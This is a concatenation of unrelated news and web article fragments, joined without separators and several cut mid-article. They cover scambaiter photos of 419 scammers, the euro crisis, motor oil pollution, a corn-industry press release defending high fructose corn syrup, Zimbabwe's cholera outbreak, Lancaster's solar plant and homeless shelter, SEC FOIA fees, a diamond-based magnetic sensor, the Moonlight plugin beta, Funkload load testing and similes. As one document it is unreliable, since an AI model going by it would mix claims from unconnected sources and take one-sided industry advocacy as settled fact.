In this section you will find a selection of pictures that scambaiters have managed to get from their scammers .
Note that although the large majority of the people featured here are the scammers themselves , sometimes they pay , or even threaten with violence , innocent people to pose on their behalf .
Yet another reason to despise these evil people even more .
As most of you have probably guessed , most of the names the scammers use are of course entirely false as well .
It should also be noted that scambaiters do NOT go actively seeking scammers of a certain skin colour .
We only engage thieves who send us emails trying to steal from us .
We do not target any particular type of person or country .
It is important to understand that scambaiters only respond to scam emails we receive .
Unfortunately it is a sad fact of life that the majority of " 419 " scams do originate from Western and Southern Africa - we estimate 50 % - 55 % of " 419 " scam attempts are sent from these places - but these scams also come from places such as England , Spain , Ireland , USA , Canada , The Netherlands , Australia and many more .
ALL the images here are a direct result of a CRIMINAL or CRIMINALS , trying to STEAL money from people they assume to be innocent soon - to - be victims .
They tried all made contact with us first , with the sole intention of stealing our money .
For the most part these criminals are not , " poor people trying to scratch a living " , but are indeed very prosperous compared to their law - abiding countrymen , and many operate in highly organised , and highly successful criminal gangs .
Millions of dollars are stolen on a DAILY basis , with absolutely no thought given to victims , who are losing vast amounts of money , homes , relatives , jobs and worse .
Contrary to popular belief , it is not just " greedy & stupid people " that fall for these scams .

The drama may be prolonged and could take its toll on one of the world 's most successful currencies : the euro .
If this crisis happened 15 years ago , currencies of various countries in Europe would have depreciated and this would have mitigated some of the shock , Hendry said .
During the recent boom years , Europe was captured by private equity mania , small businesses were laden with debt , credit cards and consumer credit flourished .
Now the debt must be paid and Hendry says it may take 10 years for this to be achieved .
A 10 percent to 15 percent contraction of the European economy is possible over the next 36 months and after that " we 'll spend six years recouping to the GDP level of 2007 , " he predicted .
Without a flexible exchange rate , unemployment will surge , especially in the weaker euro zone members , the PIIGS as Hendry calls them – Portugal , Italy , Ireland , Greece and Spain – and these countries will break out of the single currency .
How Zero Rates Can Sting
The problem with massive easing is that once interest rates have hit zero there is nowhere they can go , analysts said .
And rates at 0 percent can start to do damage .
Rates below 0.5 percent in the U.S. could generate losses at money market mutual funds , which charge a fixed management fee , Paul Ashworth , an analyst with Capital Economics , wrote in a research note .
In turn , outflows from these funds would have a knock - on effect on already battered credit markets , as money market funds have over $ 3 trillion under management and a third of that is invested in commercial paper and corporate bonds .
Redemptions will mean funds will dump these assets and forced selling could push up borrowing costs for businesses , choking them even further , Ashworth wrote .
In the UK , rates at zero may mean that savers will not feel any incentive to keep cash in long - term deposits , making it harder for banks to meet their regulatory liquidity ratios , economists from Investec said .
" What is currently more important than the price of money is the quantity of money , " Investec 's Philip Shaw wrote , adding that UK rates may get close to zero by the spring .
Printing Money
The Fed has already moved on from using interest rates as a monetary policy tool and the next fed funds target rate after the Dec. 16 meeting is " almost academic , " ING economist Rob Carnell said .
The Fed 's balance sheet has expanded to more than $ 2 trillion , made up of collateral received in exchange for liquidity provision , or loans of Treasurys .
" In our view , this is , for want of an alternative description , ' printing money ' , " Carnell wrote in his research .
" And our assumption is that there is more of this to come . "
Q : Used motor oil is a big contributor to the pollution in our waterways and drinking water .
How can I make sure I am not contributing to this problem ?
– John Eckerle , Jupiter , Fla .
A : Motor oil leaked from individual vehicles – or outright dumped by homeowners and commercial garages – constitutes a significant percentage of storm water runoff , the precipitation that runs off of roads and parking lots and finds its way into local bodies of water .
These pollutants include not only leaked motor oil ( which may contain toxic substances such as lead , benzene , zinc , or magnesium ) but also fertilizers , insecticides , plastic debris , cigarette butts , paints , solvents , sediments , and other hazardous waste .
Topsoil and natural vegetation would ordinarily filter out many of these pollutants , but the impermeable pavement that covers much of the surface where these pollutants originate allows it to flow into storm drains and then into streams , rivers , lakes , and the ocean .
There , it may poison marine life – which we might eat – as well as riparian or coastal ecosystems .
This pollution also finds its way into underground aquifers that supply drinking water , so reducing it is a human health measure and could also save municipalities millions of dollars in costs associated with drinking - water treatment facilities .
While government agencies try to craft and implement development and zoning standards to help reduce storm water runoff problems caused by commercial and industrial entities , there is still much that individuals can do to reduce storm - water impact as well .
According to the US Environmental Protection Agency ( EPA ) , 40 percent of all oil pollution in the United States comes from the improper disposal of used motor oil by individuals .
One quart of motor oil can pollute 250,000 gallons of water .
The EPA recommends keeping on top of car maintenance to prevent and repair leaks and disposing of used motor oil and other automotive fluids and batteries at designated drop - offs or recycling locations ( consult Earth911.org to find one near you ) .
Many gas stations or garages will recycle used motor oil for you .
Also , it is preferable to wash your car at a commercial carwash instead of in your driveway .
By law , carwashes must treat their wastewater before disposing of it .
Besides handling and discarding your motor oil responsibly , cutting back on or eliminating fertilizers and pesticides from your lawn or garden will also reduce your negative impact .
And do n’t overwater your lawn , as that can create extra runoff as well .
If you are embarking on a residential landscaping project , try to incorporate permeable pavement ( which allows runoff to percolate through it into the soils below ) , rain barrels to collect water , and rain gardens , grassy swales , and driveway - side vegetative strips – all planted with region - appropriate native plants , of course – to help filter out contaminants before they hit the storm sewers .

A supplement in the December 2008 edition of the American Journal of Clinical Nutrition that reviews the history and development of high fructose corn syrup finds no scientific support for the hypothesis that high fructose corn syrup is causally linked to obesity in the United States or globally any more or less than other caloric sweeteners .
Following a symposium that brought together scientific leaders on this topic from varying backgrounds , including former high fructose corn syrup critics who had earlier expressed concern that high fructose corn syrup might pose unique problems , a consensus is emerging that this sweetener is in fact indistinguishable from sucrose in its metabolic effects .
According to Victor Fulgoni , Symposium Chair , in his summary of the presented papers , “ Thus , we now have a clearer picture about HFCS ; namely , metabolic responses are similar to sucrose as would be expected from the composition of these 2 sweeteners . ”
“ This symposium exposes the crux of confusion about high fructose corn syrup : it is a case of mistaken identity between two sweeteners , ” said Audrae Erickson , President of the Corn Refiners Association .
“ Many confuse pure ‘ fructose ’ with ‘ high fructose corn syrup , ’ a sweetener that never contains fructose alone , but always in combination with a roughly equivalent amount of a second sugar ( glucose ) .
Recent studies that have examined pure fructose - often at abnormally high levels - have been inappropriately applied to high fructose corn syrup and have caused significant consumer confusion . ”
Experts from academia and industry , including : James M. Rippe , M.D. , a cardiologist and founder of the Rippe Lifestyle Institute ; John S. White , Ph.D. , founder of White Technical Research ; as well as former high fructose corn syrup critics Peter J. Havel , D.V.M. , Ph.D. , a nutrition researcher at U.C. Davis ; and Barry M. Popkin , Ph.D. , professor of nutrition at the University of North Carolina Chapel Hill , convened to analyze detailed high fructose corn syrup data .
They reviewed the following :
• Why high fructose corn syrup is used as a food ingredient
• The contribution high fructose corn syrup makes to consumers ’ diets
• The latest research on the metabolic effects of high fructose corn syrup
Highlights from the review of available data ( authored by John S. White , Ph.D. ) on all sweeteners from the 1970s to the present show :
• High fructose corn syrup contains the same sugars compositionally as other fructose / glucose - based sweeteners like sucrose ( or table sugar ) , honey or fruit juice concentrates .
• Fructose - glucose sweeteners are metabolized through the same pathways regardless of their dietary source .
• There are no known substantial metabolic or nutritional differences between high fructose corn syrup and sucrose .
Both have a composition of approximately equal parts fructose and glucose .
• High fructose corn syrup and sucrose offer equivalent sweetness and both contain 4 calories per gram .
• From 1970 - 2005 , caloric intake in the United States increased by 24 % .
This was not due to a disproportionate increase in added sugars ( including high fructose corn syrup ) , but rather an overall increase in calories from all food sources including fats and all other nutrient groups .
• Per capita consumption of high fructose corn syrup has declined in the United States in recent years , but obesity rates continue to rise .
• High fructose corn syrup accounts for about one - half of sweetener use in the United States but only 8 % worldwide , yet obesity rates are climbing in countries that use little or no high fructose corn syrup .
Sugar remains the predominant global sweetener .
For years , widespread confusion about the sweetener has existed within the scientific community and general public , fueled by erroneous links to research utilizing pure fructose , as well as by misinformation about the differences between pure fructose and high fructose corn syrup .
High fructose corn syrup never contains fructose alone .
Like sucrose , high fructose corn syrup is always in combination with a roughly equivalent amount of a second sugar , glucose .
However , Dr. White said , “ Studies which use pure fructose and generalize their findings to high fructose corn syrup are misleading .
High fructose corn syrup is most similar to sucrose , not fructose . ”
Therefore , using fructose to approximate how high fructose corn syrup behaves metabolically is not sound science .
“ The real takeaway here is that excess consumption of any type of calories will contribute to weight gain .
Therefore , we ca n’t pin obesity in the United States or elsewhere to any particular type of sweetener use , including high fructose corn syrup , ” said Dr. White .
High fructose corn syrup is made from the natural grain product of corn .
It contains no synthetic ingredients or color additives and it meets the U.S. Food and Drug Administration ’s definition of “ natural ” .
No Unique Effects On Metabolism
The true cause of the obesity crisis is more likely an increase in caloric intake overall .
A second review in the December 2008 supplement of American Journal of Clinical Nutrition ( James M. Rippe M.D. , et. al ) titled “ High fructose corn syrup , energy intake , and appetite regulation 1 - 4 ” examines the existing studies comparing high fructose corn syrup and sucrose consumption in men and women , and concludes there are no significant differences in outcome measures of metabolism .
“ Rather than focusing on differences between one caloric sweetener and another , long - term studies comparing high fructose corn syrup - sweetened beverages with non-caloric beverages are more relevant to the issue of increased caloric intake of sweeteners overall .
We definitely need more research in this area given the high consumption of sweeteners overall , ” said Dr. Rippe .
“ As researchers continue to examine the role of sweeteners in the diet , it ’s important to understand the differences between the various sweeteners tested in scientific studies , " Dr. Rippe added .
“ Testing fructose alone and then generalizing any findings to high fructose corn syrup misleads the consumer .
It is important that sound science is communicated in meaningful ways to the public . ”
While scientists agree excess intake of added sugars and other sources of extra calories is not beneficial to the American diet , the articles demonstrate why high fructose corn syrup should not be singled out as a root cause of obesity .
These American Journal of Clinical Nutrition papers provide further support for the American Medical Association ’s June 2008 statement that “ … high fructose syrup does not appear to contribute to obesity more than other caloric sweeteners . ”
CRA is the national trade association representing the corn refining ( wet milling ) industry of the United States .
CRA and its predecessors have served this important segment of American agribusiness since 1913 .
Corn refiners manufacture sweeteners , ethanol , starch , bioproducts , corn oil , and feed products
from corn components such as starch , oil , protein , and fiber .
The situation in Zimbabwe may soon " implode " as a cholera outbreak spreads and basic services collapse , South African leaders and a group of international statesmen warned yesterday .
On the eve of talks in South Africa between Robert Mugabe 's Zanu - PF party and opposition rivals , South African leaders sharply upgraded their crisis assessment and warned of Zimbabwe 's imminent collapse if urgent action was not taken .
About 6,000 people have contracted cholera in recent weeks , according to the UN , and almost 300 have died .
A chronic shortage of medicine has sent hundreds of people south to seek treatment in South Africa .
" Unless this root cause of the political absence of a legitimate government is solved , the situation will get worse and may implode and collapse ...
It is now an urgent matter , because people are dying , " said South Africa 's caretaker president , Kgalema Motlanthe .
Three eminent statesmen representing a group called the Elders , which was established last year to tackle international issues , said Zimbabwe was in a far worse position than previously thought .
The team - the former UN secretary general Kofi Annan , former US president Jimmy Carter and Graça Machel , the rights activist and wife of Nelson Mandela - had planned to visit Zimbabwe last weekend to assess the humanitarian situation but were refused visas by the government .
Instead they remained in South Africa talking to aid groups , refugees and civil society leaders .
Carter told reporters yesterday : " The entire basic structure ... is broken down .
These are all indications that the crisis in Zimbabwe is much greater , much worse than we ever could have imagined . "
The country has been locked in political stalemate since presidential elections in March when Morgan Tsvangirai , the leader of Zimbabwe 's opposition Movement for Democratic Change , defeated Mugabe in the first round of voting .
Tsvangirai pulled out of the June run -off however due to violence and intimidation of his supporters , allowing Mugabe to claim victory .
Attempts to agree a power sharing arrangement have foundered as Mugabe insisted on keeping most of the ministries for his Zanu - PF party .
In the meantime , the economy has disintegrated and the health system is close to breakdown .
Four big hospitals , including two in Harare , have effectively closed their doors to new patients owing to a shortage of basic supplies and running water , the Elders said .
Even women needing caesarean sections are being turned away .
Machel said it was clear that the state could no longer offer basic services and was failing its people .
" We have a sense that either the leadership does n't have a clear picture of how deep the suffering is of their own people , or they do n't care , " she said .
The African National Congress leader , Jacob Zuma , who is likely to become South Africa 's president next year , expressed concern about the cholera outbreak and said the ANC would send a delegation to Zimbabwe to assess the situation .
" We are dealing with a situation that is affecting the lives of people , " he said .
South Africa has already threatened to withhold £ 18 m in food aid to Zimbabwe unless a political solution is found .
Zuma and Motlanthe tried to increase the pressure on Mugabe and Tsvangirai to implement a power - sharing agreement and address the growing humanitarian crisis .
But unless Mugabe makes concessions , Tsvangirai will be left in a difficult position , forced to choose between accepting a weak position in government and holding out , leaving the country 's dire socioeconomic situation to worsen .
Annan said that leaders of the Southern African Development Community had not yet put enough pressure on Zimbabwe to find a political solution .
" I think it is clear that SADC should have done more , " he said after meeting Zuma and Motlanthe yesterday .
The Elders said they were shocked by the stories they had heard coming out of Zimbabwe .
" It is not just the extent of Zimbabwe 's humanitarian crisis , but the speed of deterioration in the past few weeks that is most worrying , " said Annan .
" The scale , depth and urgency of the situation are under- reported . "
The cholera epidemic has been caused by the collapse in the water and sanitation infrastructure .
Cases have been reported in nine of the country 's 10 provinces .
Fatality rates are well above the international emergency rate of 1 % due to a lack of drugs and medical assistance .
They lined up for meatball sandwiches the other night outside the Lancaster Community Shelter , in the cold of the high desert .
There was a man in a fedora who ’d lost his house to the bank .
A college student whose loans fell through .
An older woman with curlers in her bag , who planned to do her hair after dinner .
Everyone had a story to tell , a cigarette to borrow , a friend to greet .
But soon , the crowd hushed as a young mother and her boyfriend walked toward the door carrying 3 - week - old twins .
They had no money , nowhere to stay , they said .
Between them , they ’d applied for a dozen jobs -- she got all gussied up for her interview at Denny ’s , even borrowed a pair of heels -- but they ’d had a run of rotten luck , she said .
The buzz in the Antelope Valley these days is about a company called eSolar , which is putting the finishing touches on a thermal solar energy facility here -- 24,000 mirrors that glitter like diamonds when you approach on Avenue G .
There are plans for several more facilities in the area , all larger , the company says .
Local officials are atwitter at the possibilities .
Visitors and investors are expected from Saudi Arabia and Kuwait .
A slew of jobs would be created ; there were 225 people working last week on the Avenue G facility alone , most of them locals .
Lancaster Mayor R. Rex Parris said the solar plants could be the catalyst to restoring the sort of “ intellectual excitement ” that existed when aerospace , still a vital industry here , was the only game in town -- when “ if it went up , it came out of here , ” he said .

“ Now , we ’re going to go a long way toward saving this world , ” the mayor said .
“ Right here in Lancaster . ”
It ’s heady talk , and people are listening .
Lancaster and the surrounding valley are suffering , even by the standards of a community that long ago acclimated to a boom - and - bust cycle .
Many here are living on the edge , and some beyond , with tens of thousands more expected to arrive in coming years .
There is a sense that development cannot come fast enough , not with shops closing , one in five people living in poverty , high unemployment and the highest mortality rate in Los Angeles County .
Not with so many houses falling into foreclosure that the city of Lancaster has gone into real estate -- buying and renovating empty homes to slow the decline of neighborhoods .
“ It ’s bad , ” said William Turner , 21 , who got a job installing eSolar mirrors through a temp agency .
He is among those vying for one of the full - time positions the company will offer soon ; competition will be fierce and many of those hired will be overqualified for their jobs , officials said .

“ People around here are really hurting , ” Turner said .
“ We need a change . ”
ESolar operations and maintenance manager Bob Holsinger was the fourth of five siblings who grew up on an Illinois soybean farm , and he still looks the part , with broad , rounded shoulders and aircraft - carrier - sized boots .
When Holsinger was young , his father dispensed one piece of advice to the kids : “ Last one out , turn out the lights . ”
It was meant , of course , to cut down on the power bill .
But Holsinger always suspected it meant something else -- that whoever controlled the flow of electricity would be the last one standing , even if everything else went south .
Today , after a 35 - year career in energy , it turns out he might have been right .
California is the epicenter of U.S. solar technology ; there are dozens of energy projects in the works .
Few have generated as much anticipation as this one , if only because with 1,000 mirrors being installed each day , it is growing in stark contrast to the boarded - up storefronts and the brown , brittle lawns in front of abandoned houses .

The company uses the mirrors to focus the sun ’s rays on an elevated target , which produces superheated steam that turns turbines to create power .
The whole thing can be assembled easily , like an Erector Set for grown - ups .
Workers can put it together using four wrenches .
The mirrors can be adjusted remotely from the company ’s headquarters in Pasadena to ensure that they are capturing the sun .
The mirrors can be fine - tuned ; workers at a test site recently used the reflection to spell out the words “ HAPPY BIRTHDAY BILL ” for a colleague .
“ It ’s pretty slick , ” Holsinger said .
When eSolar flips the switch , five megawatts of electricity will be sent into the grid , enough to power roughly 5,000 homes .
A second facility , far larger , is expected north of Lancaster , and there are plans for several more in the area , enough to produce 500 megawatts , perhaps , in the next decade , the company says .
Advertisement
“ We are not going to have a carbon footprint in 10 years .
We just wo n’t have one , ” said the mayor , a successful lawyer given to hyperbole , and to infectious passion .
It is an unlikely development in the Antelope Valley , which remains , despite its growth and increasing diversity , a strait - laced , conservative area .
“ Culturally , it is somewhat new , ” said Barry S. Munz , vice president at Antelope Valley Engineering Inc. , a contractor at the eSolar site .
But how important is it ?
“ We will turn flips for them , ” Parris said .
“ And , quite frankly , I do n’t turn flips for anybody . ”

Back at the homeless shelter , it ’s easy to see why .
Resident case manager Bobby Hampton said the shelter now serves up to 120 dinners each night , half again as many as when he started six years ago .
Demand has been rising ; this summer , he said , “ business started booming . ”
A striking number of clients lost their homes to the bank ; others unwittingly rented rooms in abandoned houses taken over by unscrupulous squatters , only to get kicked out when they were discovered .
The shelter is now full every night .
Waiting in line for a cot , Jerry Frazier , 50 , a recovering heroin addict , said he received $ 199 for the month through the county - funded General Relief program .
He spent $ 175 on a month ’s supply of medication at a methadone clinic , leaving him $ 24 for the rest of the month .
He ’s been unable to find a job , he said ; a former professional musician , he just pawned the last of his 32 guitars .
Advertisement
“ This is a working country , ” he said .
“ But there are no jobs .
Not here . ”
Once inside , those accepted for a bed were required to bathe , then routed into a line for dinner that snaked through the hall .
A volunteer began to pray .
“ Hats off ! ” a security guard shouted .
In one corner , Jennifer Schmidt , 19 , and her boyfriend , Treavon Henry , 20 , ate their food in silence , their twin newborns , Kory and Kody , resting in car seats on the table .
Schmidt and Henry began dating in high school and could not have imagined what has happened since .
Schmidt was on the pill but got pregnant anyway .
Both lost their jobs .
They do n’t have enough money to get a market - rate apartment and have been on a waiting list for indigent housing since April .
Advertisement
They were living with her mother but were told to leave after Schmidt asked her not to smoke in front of the babies , Schmidt said .
Then they moved in with his mother ; she kicked them out , too , after Schmidt asked her not to cuss in front of the babies .
Exhausted , they slumped in Hampton ’s cluttered office as he filled out a voucher for a room at a motel for one night .
Then they carried the twins into the chilly night .
With no car -- they sold their Acura a few months back for $ 500 -- they would have to walk .
Each carried a twin , until Schmidt ’s arms could n’t take any more .
Henry picked up both twins and , holding them out to his side , struggled down the street toward the motel , past auto body shops and bail bonds offices .
“ It feels like we ’ve been walking forever , ” Schmidt said .
Advertisement
Finally , they got to the motel .
The marquee outside said : “ KARAOKE , Sun-Wed . ”
By the time they walked into their room , Kody was crying .
He was hungry , Schmidt said , and they were out of formula .

Thanks to A. December 26 , 2008 SEC TAKING STEPS TO FURTHER BLOCK PUBLIC ACCESS TO ITS RECORDS By A
At at time when transparency and accountability in financial markets are of the utmost critical importance to the nation , the Securities and Exchange Commission has just announced on December 23rd that it will substantially bump up the fees it charges for records requests in the guise of recouping its costs .
http://www.sec.gov/rules/proposed/2008/34-59150.pdf
Search and review fees will be bumped up from the two categories : 16 and 28 dollars per hour to categories of 26 , 40 and 70 dollars per hour .
Apart from substantially raising the cost of public access to its records , the schedule quite clearly illustrates the way in which the SEC routinely lumps together search fees with review fees , despite the fact that noncommercial and newsmedia requesters are not charged review fees .
The SEC incorrectly assumes in its processing that every requester is a commercial requester , and the invoices it issues reflect that assumption .
All too frequently , noncommercial and newsmedia requesters are invoiced for " search and review " fees with no explanation or itemization of what those comprise , or an allowance for the first two hours of search time allotted to noncommercial requesters .
Moreover , the structure of the SEC fees and invoices means that the SEC may be charging review fees improperly in another way .
The OMB fee guidelines ( which the Justice Department has affirmed as federal policy ) state that review time does not include time spent resolving general legal or policy issues regarding the applicability of particular exemptions , yet SEC has been known to do this , and the inclusion of 40 and 70 dollar per hour senior staff in the fee structure suggests that this will continue to occur .
Finally , the FOIA statute provides for waiving of most fees , even for commercial requesters , if a response takes more than the time frame allowed under statute .
The SEC has omitted all mention of this provision .
The SEC 's imposition of these new fees without any attempt to rectify the existing known fee problems suggests that the SEC is attempting to impose a new toll booth on access to its information , knowing that by imposing larger fees it will deter the public from seeking access to records , particularly what it terms unsophisticated requesters , who do n't know better than to question unwarranted and outrageous fees .
These are comments submitted to the SEC regarding the proposed change in fees assessed for FOIA requests : COMMENTS ON S7-33-08
By A
At at time when transparency and accountability in financial markets are of the utmost critical importance to the nation , the Securities and Exchange Commission has just announced on December 23rd that it will in effect substantially bump up the fees it charges for records requests .
http://www.sec.gov/rules/proposed/2008/34-59150.pdf
When a simulation of a set of typical records requests is compared using the old fee schedule against the new fee schedule , the typical increase in fees is quite large .
This substantial change in fees alone sends the message that the Commission is imposing additional barriers and toll booths to accessing its information .
The Commission website itself explains that many types of SEC records are not published on the SEC website and that access is gained through a FOIA request .
Apart from substantially raising the cost of public access to its records , the schedule quite clearly illustrates the way in which the SEC routinely conflates and lumps together search fees with review fees , despite the fact that noncommercial and newsmedia requesters are not charged review fees .
Anecdotal evidence through interviews of various noncommercial and newsmedia requesters indicates that SEC invoices have a high error rate in favor of charging improper search and review fees to such requesters and conflating the two types of charges .
Moreover , the fee invoices typically fail to identify the fee category in which the requester has been placed and the rationale behind the charges .
It is much as if one received a credit card bill or restaurant check without any itemization at all .
The SEC frequently incorrectly assumes in its FOIA processing that every requester is a commercial requester , and the invoices it issues reflect that assumption .
All too frequently , noncommercial and newsmedia requesters are invoiced for " search and review " fees with no explanation or itemization of what those comprise , or an allowance for the first two hours of search time allotted to noncommercial requesters .
Moreover , the structure of the SEC fees and invoices means that the SEC may be charging review fees improperly in another way .
The OMB fee guidelines ( which the Justice Department has affirmed as federal policy ) state that review time does not include time spent resolving general legal or policy issues regarding the applicability of particular exemptions , yet there is some indication that SEC has been known to do this and the charges for such activity dutifully recorded in the invoices .
The inclusion of 40 and 70 dollar per hour senior staff in the fee structure suggests that this will continue to occur , since the participation by such senior staff in the process is often associated with the very activities OMB orders should not be charged .
Finally , the FOIA statute now provides for waiving of most fees , even for commercial requesters , if a response takes more than the time frame allowed under statute .
The SEC has oddly omitted all mention of this provision in its proposed rules change .
The SEC 's imposition of these new fees without any attempt to rectify the existing known fee problems suggests that the SEC is attempting to impose a new toll booth on access to its information , knowing that by imposing larger fees it will deter the public from seeking access to records , particularly what it terms unsophisticated requesters , who do n't know better than to question unwarranted and outrageous fees .
Bernard Madoff would be proud .
Occasionally , however , co-ops choose not to heed Mr. Glass ’s advice .
There was the time when a television personality bought a floor - through apartment in a prewar building and proposed converting it into a one - bedroom by changing all the additional bedrooms into bathrooms or walk - in closets .
Mr. Glass worried that it would hurt resale values , but the co-op let it go , saying the next owner would just change it back at his or her expense .
Mr. Glass shrugs it off .
After years of watching the wealthy flood Manhattan and do extensive renovations , no excess surprises him .
He has seen it all : the multimillion - dollar gut renovation that spread across three years .
The couple who bought on Fifth Avenue facing the park and then requested so many plantings on a terrace that it blocked their views .
A sudden insistence on $ 30,000 French stoves that require more ventilation than can be reasonably accommodated .
He sighs , “ Odds are no one will really cook on them anyway . ”
For the record , Mr. Glass lived in a rental most of his life .
Only recently did he buy into a co-op , in Union Square .
But he has no plans to get involved with its decision making .
Still , perhaps no one knows the interior life of co-ops better than he .
Mr. Glass grew up in the Bronx , the son of an architect .
His father , M. Milton Glass , was prominent in city planning and a partner in the architecture firm of Meyer , Whittlesey & Glass , which designed Butterfield House on 12th Street and 220 Central Park South , among others .
He was always intrigued by the family business and received a five - year degree in architecture from Cornell University in 1957 .
He meant to get into design , of course .
But his real business , that of reviewing others ’ work , developed in the 1960s .
It came about almost by accident when a client called his father to resolve a dispute .
He sent Elliott , and the son began being called in to write reports .
The business built slowly in the 1970s and then exploded with the boom in converting rentals into co-ops in the 1980s .
Now , Mr. Glass says , even though his services run $ 350 an hour , he has more work then he can handle .
Providing a glimpse into the infinitesimal , physicists have found a novel way of spying on some of the universe 's tiniest building blocks .
Their " camera , " described this week in the journal Nature , consists of a special " flaw " in diamonds that can be manipulated into sensitively monitoring magnetic signals from individual electrons and atomic nuclei placed nearby .
The new work represents a dramatic sharpening of the basic approach used in nuclear magnetic resonance ( NMR ) and magnetic resonance imaging ( MRI ) , which ascertain chemical structures and image inside human bodies by scanning the magnetic activity of billions of individual nuclei .
The new diamond - based magnetic sensor could enable novel forms of imaging , marrying NMR 's noninvasive nature with atomic - scale spatial resolution , potentially benefiting fields ranging from materials science , spintronics , and quantum information to structural biology , neuroscience , and biomedicine .
Among other applications , the new research could make it possible to peer inside proteins , map the structure of impossibly intricate molecules , closely observe the dynamics of microscopic biochemical processes , monitor the activity of neural circuits , or use single electrons and nuclei for storing and processing information .
Some of these applications were recently described by the authors in a separate contribution published online Sept. 14 in the journal Nature Physics .
" Although some existing magnetic field sensors have higher sensitivity , they probe magnetic fields over large volumes of space , " says Mikhail D. Lukin , professor of physics in Harvard University 's Faculty of Arts and Sciences .
" The combination of excellent sensitivity and nanoscale spatial resolution that we demonstrate is completely unique .
Potentially , it may allow one to image single nuclei in individual molecules . "
The collaborative research , led by Lukin and Harvard physicists Amir Yacoby and Ronald L. Walsworth , involved scientists from Harvard , the Smithsonian Institution , the Massachusetts Institute of Technology , and the University of Pittsburgh .
The work builds on a Science paper published last year by Lukin and colleagues .
That paper reported that single atoms of carbon - 13 -- which make up some 1.1 percent of natural diamond -- can be manipulated via a nearby single electron that can , in turn , be controlled by focusing laser light on a diamond lattice flaw where nitrogen replaces an atom of carbon .
Such excitation using optical and microwave radiation causes the diamond flaw 's electron spin to act as a very sensitive magnetic probe with extraordinary spatial resolution .
An electron 's spin , or intrinsic angular momentum , acts like a tiny magnet , providing one of the few outwardly detectable signs of an atom 's location .
An atomic nucleus can also have a spin , but because a nucleus is much heavier than an electron , its magnetic field is a thousand times smaller , making it much harder to detect .
" Our magnetic sensor is based on a single electronic spin associated with an impurity or flaw in a small diamond crystal .
We managed to turn our understanding of quantum information physics into an extraordinary measuring apparatus , " says Yacoby , professor of physics at Harvard .
" A nanocrystal of diamond containing this specific type of impurity could be placed on the tip of a needle as a minuscule probe of extremely weak magnetic fields , such as those generated by the spin of an electron or even an atomic nucleus . "
The 2007 work effectively brought the futuristic technology of quantum information systems into the realm of solid - state materials under ordinary conditions ; the current research builds on that advance to develop new nanometer - scale magnetic sensors that could have important new implications in imaging of a variety of materials , biological compounds , and tissues .
" Precision sensing of magnetic fields is at the forefront of a wide range of scientific fields -- from nanoscience to bioimaging , " says Walsworth , senior lecturer on physics at Harvard and senior physicist at the Smithsonian .
" Potential nanoscale applications of the diamond magnetic sensor include detection of individual electron and nuclear spins in complex biological molecules , and serving as a universal ' quantum magnetic head ' for addressing and readout of quantum bits of information encoded in an electron or nuclear spin memory . "
Accompanying this work in the current issue of Nature is a report from scientists at the University of Stuttgart who 've obtained the first scanning images using a diamond magnetic sensor .
" This is a case where the sum of two contributions is really greater than their parts , " says Lukin .
" Together , they really jump - start a new research field . "

The first beta release of Moonlight 1.0 , an open source implementation of Microsoft 's Silverlight framework , is now available for download from the project 's official web site .
This release is the first step towards bringing robust Silverlight compatibility to the Linux desktop .
Development on Moonlight began last year after Microsoft demonstrated Silverlight at MIX 07 .
Lead Mono developer Miguel de Icaza and his team produced a working Moonlight prototype after an intense 20 - day hackathon during which the enthusiastic participants produced thousands of lines of code .
When Silverlight 1.0 was officially released in September , Microsoft announced plans to collaborate with Novell 's Moonlight developers in order to ensure full Silverlight support on the Linux platform .
Microsoft supplied test suites and also agreed to make binary audio and video codecs available for the Linux plugin .
Moonlight 1.0 is implemented in C++ and is distributed as a self - contained Firefox plugin .
It leverages the browser 's own JavaScript interpreter to support the scripting capabilities of Silverlight 1.0 .
The plugin itself is entirely open source and is licensed under the GNU LGPLv2 .
It is currently only available for x86 and x86 - 64 architectures , but support could potentially be added for additional architectures in the future .
The plugin does not include the proprietary codecs that are required to support Silverlight 's multimedia formats .
When users visit a web page with Silverlight content that uses the codecs , a message dialog is displayed that offers to automatically download Microsoft 's media pack , which provides the proprietary codecs in binary format .
It is also possible to compile Moonlight from source with ffmpeg instead of using Microsoft 's codecs .
For more details , check out de Icaza 's blog entry about the Moonlight media stack .
I 've tested the plugin with Ubuntu 8.04 and Firefox 3 on my main desktop computer .
I 've experienced one crash so far , but it 's working relatively well for a beta release .
The developers have published a list of web sites with Silverlight 1.0 content that you can use for testing purposes and they have ranked how well each one works with Moonlight .
It does a great job with some of the more sophisticated ones , such as the chess viewer .
The plugin also includes some simple tools to aid Silverlight debugging , including an XAML inspector , a properties display , and a source list that makes it easy to view XAML files and other media assets that get stored in the browser cache .
Moonlight is not compatible with Silverlight 2.0 yet , so you will see an error message or an image prompting you to install Silverlight when you encounter pages that require 2.0 .
The Moonlight team is working swiftly to implement 2.0 support and expect to have a 2.0 alpha ready by March .
The 2.0 version will use Mono to support execution of C# and other languages that run on Microsoft 's open source Dynamic Language Runtime .
The progress that has been made so far is enormous and the plugin is a very impressive achievement .
Although there is still much work to be done before Moonlight provides feature - parity with Silverlight , the new beta release demonstrates the viability of the project and the value that it brings to the Linux platform .

We are getting ready to roll out a new service at work , and are particularly concerned about the traffic levels it could receive , so we embarked on a quick - and - dirty load test .
I took a quick look at the open source tools available , and most are only capable of hammering on a URL , or on a list of URLs .
Because our application is dynamic , with newly - created unique IDs being passed from URL to URL , we needed more expressive power than a data file of URLs could give us .
Then I found funkload .
As the name ( sort of ) suggests , it can do both functional and load testing , and that is where its power lies .
The functional testing focus means that you write your tests as Python unit tests , with the full power of Python and webunit to build the test case .
Funkload can run the tests like functional tests ( run each once and see if they succeed ) , or like load tests ( run just one , but over and over ) .
I wrote a test case that runs through the entire experience end - to - end , about a dozen URLs , screen - scraping the returned HTML where I needed to extract dynamic data for use in the next URL .
Funkload then ran the test on many thread at a measured rate , producing a report on tests per second , successes and failures , and so on .
Looking at the funkload ’s numbers and the server stats during the test , we could determine the traffic load our servers are capable of .
Funkload is n’t the fanciest load tester out there , and if you only need to hammer on a home page , it ’s more than you need , but for load testing dynamic applications , it ’s just right .
Q : My question is about metaphors / similes .
When someone says , “ He ’s strong as an ox , ” it ’s a simile .
When someone says , “ He ’s an ox , ” it ’s a metaphor .
When my teenage cousin says , “ He ’s , like , an ox , ” which is it ?
A : It ’s correct that “ He ’s an ox ” is a metaphor .
A metaphor is a figure of speech in which something that normally designates one thing is used to designate another .
It ’s also correct that “ He ’s as strong as an ox ” ( or “ He ’s like an ox ” ) is a simile .
